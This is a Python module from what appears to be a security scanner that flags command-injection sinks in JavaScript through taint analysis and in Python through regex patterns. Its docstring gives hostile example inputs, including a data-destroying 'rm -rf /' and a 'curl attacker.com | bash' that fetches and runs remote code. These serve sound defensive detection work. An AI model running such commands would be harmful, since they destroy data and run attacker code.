"""
cmd_injection.py
Detects Command Injection vulnerabilities.

Command Injection occurs when user-controlled input is passed to a shell or
process execution function, allowing an attacker to run arbitrary OS commands
(e.g., ; rm -rf /, && curl attacker.com | bash).

JavaScript -> AST-based (esprima + taint.py):
  Sinks detected:
    child_process  -> exec, execSync, execFile, execFileSync,
                      spawn, spawnSync, fork
    shelljs        -> shelljs.exec(), shell.exec()
    deasync        -> deasync.exec()
    Template cmd   -> exec(`cmd ${tainted}`)

Python -> regex-based:
  os.system(), subprocess.run/call/Popen/check_output(),
  commands.getoutput(), eval(), exec() with user input
"""

import re
from typing import List, Dict, Set

try:
    import esprima
    ESPRIMA_AVAILABLE = True
except ImportError:
    ESPRIMA_AVAILABLE = False

from app.detectors.taint import build_taint_set, walk, references_tainted, is_seed_source


# ── JavaScript sink definitions ───────────────────────────────────────────────

# child_process methods where the COMMAND itself is tainted (first arg)
CP_EXEC_METHODS  = {"exec", "execSync", "execFile", "execFileSync"}

# spawn — first arg is the command, second is args array
CP_SPAWN_METHODS = {"spawn", "spawnSync", "fork"}

# Objects that wrap child_process
SHELL_OBJECTS = {"child_process", "childProcess", "cp", "shell", "shelljs", "sh"}

# ── Python regex patterns ─────────────────────────────────────────────────────

PY_PATTERNS = [
    # os.system
    (r'os\.system\s*\((?![\"\'](?:[a-zA-Z0-9_\s\-/\.]+)[\"\'])',
     "os.system() called with a variable — user input can inject shell commands.", "HIGH"),
    (r'os\.system\s*\(.*(?:request\.|req\.|user|input|param|data)',
     "os.system() called with user-controlled input — command injection risk.", "HIGH"),
    (r'os\.system\s*\(.*["\'\`].*\+',
     "os.system() called with concatenated string — attacker can append shell commands.", "HIGH"),
    (r'os\.system\s*\(.*f["\'].*\{',
     "os.system() uses f-string with variable — command injection via user input.", "HIGH"),

    # subprocess family
    (r'subprocess\.(run|call|check_output|check_call|Popen)\s*\(.*(?:shell\s*=\s*True|user|input|param|request)',
     "subprocess called with shell=True or user input — command injection risk.", "HIGH"),
    (r'subprocess\.(run|call|Popen)\s*\(.*\+.*["\']',
     "subprocess called with concatenated command string — injection risk.", "HIGH"),
    (r'subprocess\.(run|call|Popen)\s*\(\s*f["\'].*\{',
     "subprocess called with f-string command — user input can inject commands.", "HIGH"),

    # commands module (legacy Python 2 / compat)
    (r'commands\.(getoutput|getstatusoutput)\s*\(',
     "commands module is deprecated and unsafe — use subprocess with proper escaping.", "MEDIUM"),

    # eval/exec with user input
    (r'\beval\s*\(.*(?:request\.|user|input|param|data)',
     "eval() called with user data — executes arbitrary Python code.", "HIGH"),
    (r'\bexec\s*\(.*(?:request\.|user|input|param|data)',
     "exec() called with user data — executes arbitrary Python code.", "HIGH"),

    # popen
    (r'os\.popen\s*\(.*(?:request\.|user|input|param|\+)',
     "os.popen() with user-controlled input — command injection risk.", "HIGH"),
]


# ── AST helpers ───────────────────────────────────────────────────────────────

def _real_snippet(code: str, line: int) -> str:
    lines = code.splitlines()
    return lines[line - 1].strip() if 1 <= line <= len(lines) else f"(line {line})"


def _detect_js_ast(code: str) -> List[Dict]:
    if not ESPRIMA_AVAILABLE:
        return _detect_python_regex(code)

    try:
        tree = esprima.parseScript(code, tolerant=True, loc=True)
    except Exception:
        return _detect_python_regex(code)

    tainted, _ = build_taint_set(tree)
    issues: List[Dict] = []
    seen: Set[tuple] = set()

    def _add(line: int, conf: str, message: str, sink: str):
        key = (line, "COMMAND_INJECTION", sink)
        if key not in seen:
            seen.add(key)
            flow = "direct user input" if conf == "HIGH" else "tainted variable"
            issues.append({
                "type": "COMMAND_INJECTION",
                "line": line,
                "severity": "HIGH",
                "confidence": conf,
                "message": f"{message} Input is {flow}. (confidence: {conf})",
                "code_snippet": _real_snippet(code, line),
            })

    def _conf(node) -> str:
        return "HIGH" if is_seed_source(node) else "MEDIUM"

    def _tainted(node) -> bool:
        return is_seed_source(node) or references_tainted(node, tainted)

    def _tainted_template_or_concat(node) -> bool:
        """Check if a TemplateLiteral or BinaryExpression (+) contains tainted data."""
        if node.type == "TemplateLiteral":
            return any(_tainted(e) for e in (node.expressions or []))
        if node.type == "BinaryExpression" and node.operator == "+":
            return _tainted(node.left) or _tainted(node.right)
        return _tainted(node)

    def visit(node):
        if node.type != "CallExpression":
            return

        callee = node.callee
        args   = node.arguments or []
        line   = node.loc.start.line if node.loc else 1

        # ── Pattern 1: child_process.exec(tainted) ───────────────────────────
        if callee.type == "MemberExpression" and hasattr(callee.property, "name"):
            method = callee.property.name
            obj    = callee.object

            # Identify if object is a known shell/cp wrapper
            obj_name = ""
            if obj.type == "Identifier":
                obj_name = obj.name
            elif obj.type == "MemberExpression" and hasattr(obj.property, "name"):
                obj_name = obj.property.name  # e.g. child_process in require("child_process")

            is_cp = obj_name in SHELL_OBJECTS

            # exec/execSync/execFile — command is first arg
            if is_cp and method in CP_EXEC_METHODS and args:
                if _tainted_template_or_concat(args[0]):
                    _add(line, _conf(args[0]) if not _tainted_template_or_concat(args[0])
                         else ("HIGH" if is_seed_source(args[0]) else "MEDIUM"),
                         f"{obj_name}.{method}() executes a shell command with user-controlled input —"
                         " attacker can inject arbitrary OS commands with ; && || |.",
                         f"{obj_name}.{method}")

            # spawn(taintedCommand, args) — command is first arg
            if is_cp and method in CP_SPAWN_METHODS and args and _tainted(args[0]):
                _add(line, _conf(args[0]),
                     f"{obj_name}.{method}() spawns a process with user-controlled command —"
                     " direct command execution risk.",
                     f"{obj_name}.{method}")

        # ── Pattern 2: exec(`rm -rf ${userPath}`) — bare exec ────────────────
        if callee.type == "Identifier" and callee.name in {"exec", "execSync"}:
            if args and _tainted_template_or_concat(args[0]):
                _add(line, "HIGH",
                     "exec() called with a template/concat string containing user input —"
                     " full shell command injection.",
                     "exec")

        # ── Pattern 3: Shell via require destructuring ─────────────────────────
        # const { exec } = require('child_process'); exec(tainted)
        if (callee.type == "Identifier"
                and callee.name in CP_EXEC_METHODS | CP_SPAWN_METHODS
                and args and _tainted_template_or_concat(args[0])):
            _add(line, "HIGH" if is_seed_source(args[0]) else "MEDIUM",
                 f"{callee.name}() called with user-controlled input —"
                 " shell command injection risk (use execFile with arg arrays instead).",
                 callee.name)

    walk(tree, visit)
    return issues


# ── Python regex detection ────────────────────────────────────────────────────

def _detect_python_regex(code: str) -> List[Dict]:
    issues: List[Dict] = []
    seen: Set[tuple] = set()
    for line_num, line in enumerate(code.splitlines(), start=1):
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        for pattern, message, severity in PY_PATTERNS:
            if re.search(pattern, line, re.IGNORECASE):
                key = (line_num, "COMMAND_INJECTION")
                if key not in seen:
                    seen.add(key)
                    issues.append({
                        "type": "COMMAND_INJECTION",
                        "line": line_num,
                        "severity": severity,
                        "confidence": "HIGH",
                        "message": f"{message} (confidence: HIGH)",
                        "code_snippet": s,
                    })
                break
    return issues


# ── Public API ────────────────────────────────────────────────────────────────

def detect(code: str, language: str) -> List[Dict]:
    if language == "javascript":
        return _detect_js_ast(code)
    elif language == "python":
        return _detect_python_regex(code)
    return []
